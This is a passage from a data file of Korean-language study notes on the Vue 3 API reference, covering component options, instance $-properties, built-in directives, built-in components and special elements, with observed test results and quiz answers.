        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "옵션            타입                       세부\nname            string                     재귀 자기 참조 · DevTools · 경고 트레이스 · KeepAlive include/exclude (명시 필요) · SFC 파일명 추론 (3.2.34+ <script setup>) · 전역 등록 이름\ninheritAttrs    boolean (기본 true)          false → 폴스루 루트 미적용 · v-bind=\"$attrs\" 로 · <script setup> 은 defineOptions({ inheritAttrs: false })\ncomponents      { [name]: Component }       로컬 등록 · 그 템플릿만 · 축약 · 이름 바꾸기 { Renamed: Bar }\ndirectives      { [name]: Directive }       로컬 등록 · 그 템플릿만",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: name 'A'·'B'·'C'인 컴포넌트에 <KeepAlive include=\"A,B,C\" :max=\"2\">가 name으로 매칭되어 캐시·LRU 동작(A:1 유지, max 초과 시 unmounted). 부모 { directives: { local } }의 v-local은 자식 템플릿에서 'Failed to resolve directive: local'(로컬 범위). Node: inheritAttrs: false + <input v-bind=\"attrs\">에 class·placeholder → <div><input class=\"x\" placeholder=\"p\"></div>. 다중 루트에 inheritAttrs 기본이면 'Extraneous non-props attributes' 경고. 자세한 맥락은 등록·KeepAlive·폴스루·커스텀 디렉티브 노드.",
        code: "name → KeepAlive include=\"A,B,C\" 매칭 ✓ · LRU ✓\ninheritAttrs: false + v-bind=\"attrs\" → 안쪽 요소에 ✓\n로컬 directives → 자식에서 Failed to resolve directive",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 넷은 '이 컴포넌트의 정체(name)와 경계(inheritAttrs), 그리고 이 템플릿의 어휘(components · directives)' 다",
        body: "name은 컴포넌트가 밖에서 불리는 이름이라 재귀·캐시·도구가 쓰고, inheritAttrs는 선언 밖 속성이 루트로 흐르는지의 스위치, components·directives는 이 템플릿이 아는 태그·디렉티브의 로컬 사전입니다. 범위는 전부 '이 컴포넌트'이고 하위로 전파되지 않습니다. <script setup>에서는 name 추론·import·vXxx·defineOptions가 각각을 대신합니다.",
      },
      {
        label: "다음 입구",
        body: "Options API의 마지막 '컴포넌트 인스턴스'는 this의 $ 프로퍼티 열셋입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 트리 컴포넌트가 자기 자신을 템플릿에서 쓰려는데 못 찾습니다. (2) <KeepAlive :include=\"['UserList']\">가 캐시를 안 합니다. (3) 래퍼의 class를 안쪽 요소로 보내려 합니다.",
        notes: [
          {
            title: "답",
            body: "(1) 재귀 참조는 name으로 해석됩니다. SFC는 파일명(TreeNode.vue → TreeNode)으로 추론되므로 <TreeNode>로 쓰면 되고, 보통 객체 컴포넌트나 파일명이 다르면 name: 'TreeNode'를 명시합니다. import한 같은 이름이 있으면 그것이 우선입니다. (2) include는 컴포넌트의 name 옵션과 매칭됩니다. <script setup> SFC는 3.2.34+부터 파일명으로 추론되니 파일이 UserList.vue인지, 보통 <script>면 name: 'UserList'가 있는지 확인합니다(실제로 name 매칭으로 LRU 동작). 등록 이름이 아니라 컴포넌트 자신의 name입니다. (3) inheritAttrs: false(<script setup>은 defineOptions({ inheritAttrs: false }))를 두고 안쪽 요소에 v-bind=\"$attrs\"를 둡니다(실제로 attrs가 안쪽 input에 감). 루트가 둘이면 자동 폴스루가 없어 어차피 $attrs를 명시해야 합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Options: Misc", href: `${DOCS}/api/options-misc` },
      { label: "Fallthrough Attributes — Disabling Attribute Inheritance", href: `${DOCS}/guide/components/attrs#disabling-attribute-inheritance` },
    ],
  },

  {
    id: "va-opt-instance",
    name: "컴포넌트 인스턴스",
    tagline: "this 의 $ 프로퍼티 열셋: $data · $props · $el · $options · $parent · $root · $slots · $refs · $attrs · $watch · $emit · $forceUpdate · $nextTick",
    intro:
      "참고서 컴포넌트 인스턴스 페이지입니다. this(공개 인스턴스 프록시)에 있는 내장 프로퍼티·메서드. 전부 읽기 전용($data 안쪽 제외). $data(data()의 반응형 객체), $props(선언된 props), $el(루트 DOM 노드. '마운트 전 undefined'. 단일 루트 요소면 그 요소, 텍스트 루트면 텍스트 노드, 다중 루트면 자리표시 노드. 템플릿 ref 권장), $options(해석된 옵션. 커스텀 옵션 접근), $parent·$root, $slots({ [name]: (...args) => VNode[] }), $refs(템플릿 ref. 비반응), $attrs(폴스루. 단일 루트에 자동), $watch(source, cb, options) → unwatch(문자열 경로·getter. immediate·deep·flush), $emit, $forceUpdate(비반응 상태용. 드물게), $nextTick(this 바인딩). 실제로 돌려 보면 mounted의 this.$el이 단일 루트 P, 다중 루트 텍스트 노드였고, this.$data._b로 접두 키를 읽었으며, $attrs·$slots·$refs의 Composition 대응(attrs·slots·useTemplateRef) 측정이 같은 런타임입니다. 이 노드의 질문은 하나입니다. this에서 무엇을 읽을 수 있고 무엇이 비반응인가.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "프로퍼티         타입                                           세부\n$data            object                                         data() 반응형 객체 (중첩 쓰기 가능)\n$props           object                                         선언된 props 만 · 읽기 전용\n$el              Node | undefined                               마운트 전 undefined · 단일 루트 → 그 요소 · 텍스트 루트 → 텍스트 노드 · 다중 루트 → 자리표시 (텍스트/주석) · ref 권장\n$options         ComponentOptions                               전역 믹스인 + extends + 믹스인 병합 결과 · 커스텀 옵션 (this.$options.custom)\n$parent          ComponentPublicInstance | null\n$root            ComponentPublicInstance                        자기면 자기\n$slots           { [name]: (...args) => VNode[] }                $slots.default · 범위 슬롯 인자 · 존재 검사\n$refs            { [name]: Element | Instance | null }           비반응 · 템플릿 데이터로 X\n$attrs           object                                         폴스루 (props·emits 제외) · 단일 루트 자동 · 비반응\n$watch(src, cb, opts?)   → unwatch                               src: 'a.b' 경로 | getter · immediate · deep · flush · onTrack/onTrigger\n$emit(event, ...args)    void\n$forceUpdate()           void                                   비반응 상태용 · 드물게\n$nextTick(cb?)           Promise<void>                           this 바인딩된 nextTick",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: Options 컴포넌트 mounted() { this.$el } → 단일 루트 <p> → P, 다중 루트 <p/><p/> → 텍스트 노드(자리표시). data: () => ({ $a: 1, _b: 2 }) → this.$a undefined, this._b 2, this.$data._b 2($data로는 접두 키도). 부모 mounted에서 this.$el.querySelectorAll('p').length 3(자식 DOM 포함). $attrs 대응: 폴스루 class 병합 'base extra', 다중 루트 경고. $slots 대응: slots.default?.() 폴백. $refs 대응: 마운트 전 null, mounted 요소. $nextTick 대응: nextTick Promise 뒤 DOM 갱신. 자세한 맥락은 라이프사이클·폴스루·슬롯·템플릿 ref 노드.",
        code: "this.$el:  단일 루트 P · 다중 루트 텍스트 노드 (자리표시)\nthis.$data._b 2 (접두 키는 $data 로) · this.$a undefined\n$attrs ≡ attrs (폴스루 'base extra' · 다중 루트 경고) · $slots ≡ slots · $refs ≡ useTemplateRef (마운트 전 null) · $nextTick ≡ nextTick",
        codeLang: "text",
      },
      {
        label: "문제의 구조: $ 프로퍼티는 Composition 의 context · 헬퍼 · 전역 함수를 this 에 매단 것이고, 그래서 같은 비반응·시점 규칙을 가진다",
        body: "$attrs·$slots·$emit은 setup context의 attrs·slots·emit, $refs는 useTemplateRef, $nextTick은 nextTick, $watch는 watch, $el은 렌더 결과의 루트입니다. 비반응인 것($attrs·$slots·$refs)은 Composition에서도 비반응이고, 마운트 뒤에만 있는 것($el·$refs)도 같습니다. $parent·$root·$forceUpdate는 명시적 데이터 흐름을 깨므로 드물게 씁니다.",
      },
      {
        label: "다음 입구",
        body: "다음 갈래 '내장 기능'은 템플릿에서 쓰는 디렉티브·컴포넌트·특수 엘리먼트·특수 속성의 API입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) created에서 this.$el이 undefined입니다. (2) this.$refs.list를 템플릿에 {{ $refs.list.offsetHeight }}로 썼더니 갱신이 안 됩니다. (3) 자식이 this.$parent.items.push(x)로 부모를 바꿉니다.",
        notes: [
          {
            title: "답",
            body: "(1) $el은 마운트 전 undefined입니다(문서. created는 마운트 단계 전). mounted부터 쓰고, 다중 루트면 자리표시 노드라 쓸모가 없으니(실제로 텍스트 노드) 템플릿 ref를 씁니다. (2) $refs는 비반응이라 템플릿 데이터 바인딩에 쓰지 말라는 문서의 주의입니다. 측정값이 필요하면 mounted/updated(또는 watch flush post)에서 재어 data에 넣고 그것을 바인딩합니다. (3) 동작은 하지만 '암묵적 부모-자식 통신'(스타일 가이드 D)이라 부모의 상태가 어디서 바뀌는지 추적이 안 됩니다. 자식은 this.$emit('add', x)로 올리고 부모가 바꾸거나, provide/inject로 변경 함수를 내립니다. $parent는 컴포넌트 구조가 바뀌면 깨집니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Component Instance", href: `${DOCS}/api/component-instance` },
      { label: "Style Guide — Implicit parent-child communication", href: `${DOCS}/style-guide/rules-use-with-caution#implicit-parent-child-communication` },
    ],
  },

  {
    id: "va-builtins",
    name: "내장 기능",
    tagline: "템플릿에서 쓰는 네 묶음의 API: 디렉티브 열넷, 컴포넌트 다섯, 특수 엘리먼트 셋, 특수 속성 셋",
    intro:
      "참고서 넷째 갈래, 네 페이지입니다. 내장 디렉티브(v-text·v-html·v-show·v-if·v-else·v-else-if·v-for·v-on·v-bind·v-model·v-slot·v-pre·v-once·v-memo·v-cloak), 내장 컴포넌트(Transition·TransitionGroup·KeepAlive·Teleport·Suspense의 props·이벤트), 특수 엘리먼트(<component>·<slot>·<template>), 특수 속성(key·ref·is). 가이드가 '어떻게 쓰나'라면 여기는 '인자·수식어·props의 전부'입니다. 실제로 돌려 보면 v-model 수식어 셋, 수식어 순서, Transition·TransitionGroup·KeepAlive·Teleport·Suspense의 동작, key 변경으로 요소 교체, is=\"vue:\"로 in-DOM 컴포넌트를 확인했습니다.",
    blocks: [
      {
        label: "네 페이지 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지          항목                                                                                측정\n디렉티브         v-text v-html v-show v-if v-else v-else-if v-for v-on v-bind v-model v-slot v-pre v-once v-memo v-cloak   v-if 제거/v-show display · 수식어 순서 · .lazy/.number/.trim · v-once 고정 · v-memo 건너뜀 · v-text 경고\n컴포넌트         Transition · TransitionGroup · KeepAlive · Teleport(defer 3.5+) · Suspense                                   클래스 프레임 · move · LRU · 자리표시 주석 · 이벤트 순서\n특수 엘리먼트     <component :is> · <slot> · <template>                                                                   :is 전환 언마운트 · slot 폴백 · 디렉티브 없는 template 은 네이티브\n특수 속성        key · ref · is                                                                                           key 변경 → input 리셋 · ref 마운트 뒤 · is=\"vue:my-row\" 제자리",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 '내장 디렉티브'부터입니다.",
      },
    ],
    sources: [
      { label: "Built-in Directives", href: `${DOCS}/api/built-in-directives` },
      { label: "Built-in Components", href: `${DOCS}/api/built-in-components` },
    ],
  },

  {
    id: "va-bi-directives",
    name: "내장 디렉티브",
    tagline: "열넷의 인자·수식어·제약: v-if 는 v-for 보다 먼저, v-on 수식어는 순서대로, v-bind 는 .camel .prop .attr, v-memo 는 같은 요소에",
    intro:
      "참고서 내장 디렉티브 페이지입니다. 열넷. v-text(textContent. 자식 덮음). v-html(innerHTML. 'XSS. 신뢰 콘텐츠만'. scoped 스타일 미적용). v-show(display 토글. 초기 display 존중. <template> X). v-if/v-else/v-else-if(제거·생성. <template> OK. v-else는 바로 뒤. 'v-for보다 우선'). v-for(Array·Object·number·string·Iterable. in/of. key 권장). v-on(@. 수식어 .stop .prevent .capture .self .{key} .once .left .right .middle .passive. 객체 문법은 수식어 X). v-bind(:. 수식어 .camel .prop(3.2+) .attr(3.2+). 3.4+ 같은 이름 축약. 객체 바인딩. in 연산자로 프로퍼티/속성 판단). v-model(input·select·textarea·컴포넌트. .lazy .number .trim). v-slot(#. template과 기본 슬롯만의 컴포넌트에. 구조 분해). v-pre(컴파일 건너뜀). v-once(한 번 렌더). v-memo(3.2+. 의존 배열. v-for와 같은 요소. 1000+ 리스트). v-cloak(컴파일 전 숨김. 빌드 없는 설정). 실제로 돌려 보면 v-if false 제거·v-show display none, .prevent.self vs .self.prevent, .once·.exact·키 별칭, .lazy/.number/.trim 값, v-once 고정, v-memo 자식 렌더 0/1, v-text + 자식 컴파일 에러 'v-text will override element children.', v-if/else 같은 key 에러. 이 노드의 질문은 하나입니다. 열넷의 시그니처는 무엇인가.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "디렉티브       기대 값                              인자 / 수식어                                               세부\nv-text        string                                                                                          textContent · 자식 덮음 (컴파일 에러)\nv-html        string                                                                                          innerHTML · XSS 주의 · scoped 미적용\nv-show        any                                                                                             display 토글 · 초기 display 존중 · <template> X · Transition ✓\nv-if          any                                                                                             제거/생성 · <template> ✓ · v-for 보다 우선 (같은 요소 비권장)\nv-else / v-else-if   - / any                                                                                 바로 앞 형제가 v-if/v-else-if · <template> ✓\nv-for         Array | Object | number | string | Iterable   item in items · (item, i) in items · (value, key, i) in obj   key 권장 · Map/Set ✓\nv-on (@)      Function | 인라인 | Object (인자 없음)   event · .stop .prevent .capture .self .{keyAlias} .once .left .right .middle .passive   순서대로 코드 · 객체 문법은 수식어 X · $event\nv-bind (:)    any (인자) | Object               attrOrProp · .camel .prop(3.2+) .attr(3.2+) · 3.4+ :id 축약           in 으로 프로퍼티/속성 · class/style 병합 · 컴포넌트 prop 은 선언 필요\nv-model       (요소별)                           컴포넌트 인자 v-model:title · .lazy .number .trim                      input · select · textarea · 컴포넌트\nv-slot (#)    JS 인자 식                        슬롯 이름 · 동적 #[name]                                           <template> 또는 기본 슬롯만의 컴포넌트 · 구조 분해\nv-pre         -                                                                                               컴파일 건너뜀 ({{ }} 그대로)\nv-once        -                                                                                               한 번 렌더 · 이후 갱신 X · v-for 도\nv-memo        any[]  (3.2+)                                                                                   의존 같으면 서브트리 건너뜀 · [] = v-once · v-for 와 같은 요소 · 1000+\nv-cloak       -                                                                                               컴파일 전 숨김 · [v-cloak] { display: none } · 빌드 없는 설정",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: v-if false → 요소 제거, v-show false → display 'none'. @click.prevent.self 자식 클릭 → preventDefault 됨·핸들러 X, @click.self.prevent → 안 됨·X. .once 한 번, .exact 조합, @keyup.enter·.page-down. v-model.lazy는 change에만, .number '12abc' → 12·'abc' → 'abc', .trim 양끝. <b v-once>{{ n }}</b> n=5 → '0'. v-memo=\"[it.v]\" 같은 값 교체 → 자식 렌더 0, 하나 변경 → 1. key 변경 → input 값 리셋. Node 컴파일: <p v-text=\"a\">b</p> → 'v-text will override element children.', v-if/else 같은 key → 'v-if/else branches must use unique keys.', prop에 v-model → 'v-model cannot be used on a prop…', 동적 인자 공백 → 'cannot contain spaces', v-model.trim.number → withDirectives(…, [[vModelText, v, undefined, { trim, number }]]), v-for → KEYED_FRAGMENT 128, 같은 요소 v-if + v-for는 통과(런타임에 변수 못 읽음). 자세한 맥락은 조건부·리스트·이벤트·폼·템플릿 문법·성능 노드.",
        code: "v-if false → 제거 · v-show false → display:none · v-once 고정 '0' · v-memo 같은 값 → 0 · key 변경 → 리셋\n.prevent.self / .self.prevent → 자식: 막힘 / 안 막힘 · .once ×1 · .exact · .page-down\n.lazy change 만 · .number '12abc'→12 'abc'→'abc' · .trim\n컴파일 에러: v-text will override element children. · v-if/else branches must use unique keys. · v-model cannot be used on a prop… · dynamic directive argument cannot contain spaces",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 열넷은 '내용(text·html) · 존재(if·show·for) · 연결(on·bind·model·slot) · 컴파일 제어(pre·once·memo·cloak)' 넷으로 묶인다",
        body: "내용 둘은 요소 안을 채우고(html은 코드 자리), 존재 셋은 요소를 넣고 빼고 반복하고(if가 for보다 먼저, key가 정체), 연결 넷은 상태와 DOM·컴포넌트를 잇고(on은 순서대로 감싸는 사슬, bind는 프로퍼티/속성 판단, model은 요소별 짝, slot은 함수), 컴파일 제어 넷은 컴파일러·갱신을 건너뛰게 합니다(pre는 컴파일, once·memo는 갱신, cloak은 컴파일 전 표시). 가이드 각 노드의 '문제의 구조'가 이 묶음별로 있습니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '내장 컴포넌트 API'는 다섯 컴포넌트의 props와 이벤트 전부입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) <svg :viewBox>가 in-DOM 템플릿에서 viewbox로 바뀝니다. (2) v-on=\"{ click: a, keyup: b }\"에 .prevent를 붙이고 싶습니다. (3) :items.prop와 :items 차이는?",
        notes: [
          {
            title: "답",
            body: "(1) in-DOM 템플릿은 HTML 파서가 속성을 소문자로 만들어 viewBox가 viewbox가 됩니다. v-bind의 .camel 수식어(:view-box.camel=\"…\")가 kebab을 camelCase로 되돌립니다(문서가 SVG viewBox를 예로 듦). SFC·문자열 템플릿은 파서를 안 거쳐 그대로입니다. (2) 객체 문법 v-on=\"{…}\"은 수식어를 지원하지 않습니다(문서). 개별 @click.prevent=\"a\" @keyup=\"b\"로 풀거나, 핸들러 안에서 e.preventDefault()를 부르거나, 렌더 함수면 withModifiers(a, ['prevent'])로 감쌉니다. (3) :items는 Vue가 요소에 items라는 DOM 프로퍼티가 있는지 in으로 보고 있으면 프로퍼티, 없으면 속성(문자열)으로 설정합니다. 커스텀 엘리먼트처럼 정의 시점에 프로퍼티가 안 보일 수 있을 때 객체가 '[object Object]' 문자열 속성이 됩니다. :items.prop(또는 .items)은 '반드시 DOM 프로퍼티로'라 객체·배열이 그대로 전달됩니다. .attr은 반대로 속성 강제.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Built-in Directives", href: `${DOCS}/api/built-in-directives` },
      { label: "Template Syntax", href: `${DOCS}/guide/essentials/template-syntax` },
    ],
  },

  {
    id: "va-bi-components",
    name: "내장 컴포넌트 API",
    tagline: "Transition · TransitionGroup · KeepAlive · Teleport · Suspense 의 props 와 이벤트 전부",
    intro:
      "참고서 내장 컴포넌트 페이지입니다. '템플릿에서는 등록 없이, 렌더 함수에서는 import. 트리 셰이킹됨'. Transition props: name·css(true)·type('transition'|'animation')·duration(number | { enter, leave })·mode('in-out'|'out-in'|'default')·appear(false)·enterFromClass·enterActiveClass·enterToClass·appearFromClass·appearActiveClass·appearToClass·leaveFromClass·leaveActiveClass·leaveToClass. 이벤트: before-enter·before-leave·enter·leave·appear·after-enter·after-leave·after-appear·enter-cancelled·leave-cancelled(v-show만)·appear-cancelled. TransitionGroup: Transition props(mode 제외) + tag(없으면 프래그먼트) + moveClass. 같은 이벤트. 'key 필수'. FLIP. KeepAlive: include·exclude(string | RegExp | 배열. name 매칭)·max(number | string). '활성 직접 자식 하나'. mounted/unmounted 대신 activated/deactivated. Teleport: to(string | HTMLElement. 필수)·disabled(boolean)·defer(boolean. 3.5+). Suspense: timeout(string | number)·suspensible(boolean). 이벤트 resolve·pending·fallback. 슬롯 #default·#fallback. 실제로 돌려 보면 Transition 클래스 프레임 타임라인·key 교체·자식 둘 경고·out-in 순서, TransitionGroup move·leave absolute·key 없음 경고·tag UL, KeepAlive LRU·훅, Teleport 자리표시·inject·disabled·없는 타깃 경고·ctx.teleports, Suspense pending → fallback → resolve·SSR 기다림. 이 노드의 질문은 하나입니다. 다섯의 props·이벤트는 무엇인가.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "컴포넌트         props                                                                                      이벤트 / 슬롯 / 세부\nTransition      name · css(true) · type · duration · mode('in-out'|'out-in'|'default') · appear(false) · {enter,appear,leave}{From,Active,To}Class   before-enter before-leave enter leave appear after-enter after-leave after-appear enter-cancelled leave-cancelled(v-show) appear-cancelled · 자식 하나\nTransitionGroup  Transition props (mode 제외) + tag (없으면 프래그먼트) + moveClass                                   같은 이벤트 · key 필수 · 클래스는 항목에 · FLIP(transform)\nKeepAlive       include · exclude (string | RegExp | (string|RegExp)[] · name 매칭) · max (number | string)              활성 직접 자식 하나 · activated/deactivated (mounted/unmounted X) · 자손에도\nTeleport        to (string | HTMLElement · 필수) · disabled · defer (3.5+)                                             타깃 먼저 존재 · 논리 트리 유지 · SSR ctx.teleports\nSuspense        timeout (string | number) · suspensible                                                               @resolve @pending @fallback · #default #fallback (각 하나) · async setup · 비동기 컴포넌트 · 실험적",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome(vue 3.5.45): Transition name=\"fade\" → nextTick 'fade-enter-from fade-enter-active' → rAF2 'fade-enter-active fade-enter-to' → 끝 ''. :key 변경 → 둘 동시(leave·enter). 자식 둘 → 'expects exactly one child element or component.' + 'can only be used on a single element or component. Use <transition-group> for lists.' mode=\"out-in\" → before-enter·after-leave @87ms → after-enter @235ms. TransitionGroup tag=\"ul\" → 루트 UL, 재정렬 → 전부 list-move → 150ms 뒤 제거, 제거 항목 leave-from/active + absolute, key 없음 → 'children must be keyed.' KeepAlive max=2 include=\"A,B,C\" → A:1 유지, LRU로 A unmounted → A:0, 훅 mounted → activated ⇄ deactivated. Teleport → 타깃에 내용, 부모 자리 <!--teleport start--><!--teleport end-->, inject ✓, disabled → 돌아옴, #nope → 'Failed to locate Teleport target…'. Suspense → '로딩…' → '비동기 setup 끝', pending → fallback → resolve. Node: Suspense 기다려 렌더, Teleport ctx.teleports. 자세한 맥락은 내장 컴포넌트 다섯 노드.",
        code: "Transition:      from+active → (rAF2) active+to → (end) '' · key 교체 둘 동시 · 자식 둘 경고 · out-in: after-leave → before-enter → after-enter\nTransitionGroup: 재정렬 → list-move 전부 → 150ms 제거 · leave 항목 absolute · key 없음 → children must be keyed.\nKeepAlive:       A:1 유지 · max=2 LRU → unmounted · activated/deactivated\nTeleport:        <!--teleport start--><!--teleport end--> · inject ✓ · disabled 복귀 · Failed to locate Teleport target…\nSuspense:        pending → fallback → resolve · SSR 기다림",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 다섯의 props 는 '자식의 시간과 자리를 어떻게 바꾸나' 의 손잡이다",
        body: "Transition의 props는 클래스 이름·끝 감지(type·duration)·순서(mode)·첫 렌더(appear)이고 이벤트는 그 타임라인의 지점입니다. TransitionGroup은 거기에 래퍼(tag)와 이동(moveClass). KeepAlive는 누구를(include/exclude) 얼마나(max) 캐시하나. Teleport는 어디로(to) 언제(defer) 끄나(disabled). Suspense는 교체 시 옛 내용 유지 시간(timeout)과 위임(suspensible). 가이드 내장 컴포넌트 노드의 '문제의 구조'와 같습니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '특수 엘리먼트'는 <component>·<slot>·<template>입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) Transition에 CSS animation과 transition이 둘 다 있어 끝이 어긋납니다. (2) TransitionGroup에 mode=\"out-in\"을 줬는데 무시됩니다. (3) <Teleport to=\"#late\">의 타깃이 같은 컴포넌트 아래쪽에 있습니다.",
        notes: [
          {
            title: "답",
            body: "(1) type=\"animation\" 또는 type=\"transition\"으로 어느 쪽 end 이벤트를 기다릴지 고정합니다. 둘이 있으면 Vue가 긴 쪽을 추측하는데 어긋날 수 있습니다. 아예 :duration=\"{ enter: 500, leave: 300 }\"으로 명시해도 됩니다. (2) TransitionGroup은 mode를 지원하지 않습니다(문서: 교대가 아니라 동시 다발이라). 항목마다 enter·leave·move가 독립이고, 순서 효과가 필요하면 스태거(data-index + JS 훅 delay)로 냅니다. (3) 3.5+ defer prop입니다. <Teleport defer to=\"#late\">는 같은 마운트/갱신 틱의 나중 요소를 타깃으로 허용합니다(mounted처럼 동작). 그 전 버전은 '타깃이 Teleport 마운트 전에 존재해야' 하므로(실제로 없는 타깃은 경고) 타깃을 Vue 트리 밖(index.html)에 두거나 Teleport를 타깃보다 아래 컴포넌트에 둡니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Built-in Components", href: `${DOCS}/api/built-in-components` },
      { label: "Transition (Guide)", href: `${DOCS}/guide/built-ins/transition` },
    ],
  },

  {
    id: "va-bi-elements",
    name: "특수 엘리먼트",
    tagline: "<component :is> · <slot name> · <template v-if/v-for/v-slot> — 컴파일되어 사라지는 셋",
    intro:
      "참고서 특수 엘리먼트 페이지입니다. '컴포넌트가 아니라 템플릿 문법의 일부로 컴파일되어 사라짐. 관례상 소문자'. <component :is=\"string | Component\">: 문자열이면 HTML 태그 이름 또는 등록된 컴포넌트 이름, 객체면 컴포넌트 정의. 내장(Transition 등)을 이름으로 쓰려면 등록 필요, 객체로 넘기면 불필요. v-model은 modelValue + update:modelValue로 확장되어 '네이티브 요소(<input>)에는 안 됨'(:value + @input으로). <slot name=\"x\" :prop>: name 없으면 default. 다른 속성은 슬롯 props로 부모에. 매칭 내용으로 교체. 네이티브 <slot>이 아님. <template>: v-if/v-else-if/v-else/v-for/v-slot과 함께일 때만 특수(래퍼 없음). 아니면 네이티브 <template> 요소. v-for와 쓸 때 key만 허용(다른 속성·디렉티브 무시). SFC 최상위 <template>은 별개(디렉티브 X). 실제로 돌려 보면 <component :is>는 전환 때 언마운트(KeepAlive로 유지), slot 폴백 렌더, 디렉티브 없는 <template>은 네이티브 template 요소로 컴파일, in-DOM의 <tr is=\"vue:my-row\">가 제자리에서 컴포넌트. 이 노드의 질문은 하나입니다. 셋은 무엇을 받고 무엇으로 바뀌나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "엘리먼트          props / 조건                                   세부\n<component>      is: string | Component                        문자열 → HTML 태그 또는 등록 이름 · 객체 → 정의 · 내장은 이름이면 등록 필요(객체면 불필요) · v-model → modelValue 짝 (네이티브 요소 X)\n<slot>           name?: string · 기타 속성 = 슬롯 props            name 없으면 default · 매칭 내용으로 교체 · 네이티브 <slot> 아님\n<template>       v-if · v-else-if · v-else · v-for · v-slot 중 하나   그때만 보이지 않는 래퍼 · 아니면 네이티브 <template> · v-for 땐 key 만 허용 · SFC 최상위 <template> 은 별개",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: <component :is=\"tab\">의 tab 전환 → 이전 컴포넌트 unmounted(KeepAlive 안에서는 deactivated/activated로 유지). Node: slots.default?.() ?? '폴백' → 내용 없으면 폴백(<slot>폴백</slot>과 같은 꼴). 컴파일: 디렉티브 없는 <template><p>a</p></template>은 출력에 \"template\" 태그가 남음(네이티브). <template v-if>·<template v-for>는 래퍼 없이 자식만. 혼합 v-slot → 'Mixed v-slot usage on both the component and nested <template>…' 에러. in-DOM: <table><tr is=\"vue:my-row\">가 제자리에서 컴포넌트로, <table><my-row>는 밖으로 끌려 나옴. 자세한 맥락은 컴포넌트 기초·슬롯·조건부·시작하기 노드.",
        code: "<component :is> 전환 → unmounted (KeepAlive 로 유지)\n<slot> 내용 없음 → 폴백\n<template> 디렉티브 없음 → 네이티브 \"template\" 요소 · v-if/v-for 와 → 래퍼 없음\n<tr is=\"vue:my-row\"> → 제자리 컴포넌트 (in-DOM)",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 셋은 '어느 컴포넌트를 · 어느 내용을 · 어느 묶음을' 가리키는 자리표시이고 렌더 결과에 자신은 없다",
        body: "<component>는 '여기에 이 컴포넌트', <slot>은 '여기에 부모의 내용', <template>(디렉티브와)은 '이 묶음에 조건·반복·슬롯'을 적는 자리표시입니다. 컴파일러가 각각 동적 컴포넌트 vnode·슬롯 함수 호출·프래그먼트로 바꾸고 태그 자체는 남지 않습니다. 네이티브 <component>·<slot>·<template> 요소와 이름이 같아 혼동하기 쉽지만, 조건(디렉티브 유무, 네이티브 요소 여부)에 따라 어느 쪽인지 갈립니다.",
      },
      {
        label: "다음 입구",
        body: "내장 기능의 마지막 '특수 속성'은 key·ref·is입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) <component :is=\"'input'\" v-model=\"x\">가 동작하지 않습니다. (2) <component :is=\"'Transition'\">이 못 찾습니다. (3) <template class=\"wrap\" v-for>의 class가 사라집니다.",
        notes: [
          {
            title: "답",
            body: "(1) <component>의 v-model은 컴포넌트용(modelValue + update:modelValue)으로 확장되어 네이티브 요소에는 맞지 않습니다(문서). :value=\"x\" @input=\"x = $event.target.value\"로 직접 풀거나, 태그가 네이티브로 정해진 경우라면 <input v-model>을 v-if로 분기합니다. (2) 문자열 is는 '등록된 이름'을 찾습니다. 내장 컴포넌트는 등록되어 있지 않아 이름으로는 못 찾고(문서: 이름으로 쓰려면 components: { Transition }), import { Transition }한 객체를 :is=\"Transition\"으로 넘기면 등록 없이 됩니다. (3) v-for가 붙은 <template>은 보이지 않는 래퍼라 key 외의 속성·디렉티브는 무시됩니다(문서). class를 주려면 안쪽 실제 요소에 두거나, 래퍼가 꼭 필요하면 <div class=\"wrap\" v-for>처럼 실제 요소로 바꿉니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Built-in Special Elements", href: `${DOCS}/api/built-in-special-elements` },
      { label: "Components Basics — Dynamic Components", href: `${DOCS}/guide/essentials/component-basics#dynamic-components` },
    ],
  },

  {
    id: "va-bi-attrs",
    name: "특수 속성",
    tagline: "key(정체 · 강제 교체) · ref(요소 · 인스턴스 · 함수) · is(동적 컴포넌트 · vue: 접두)",
    intro:
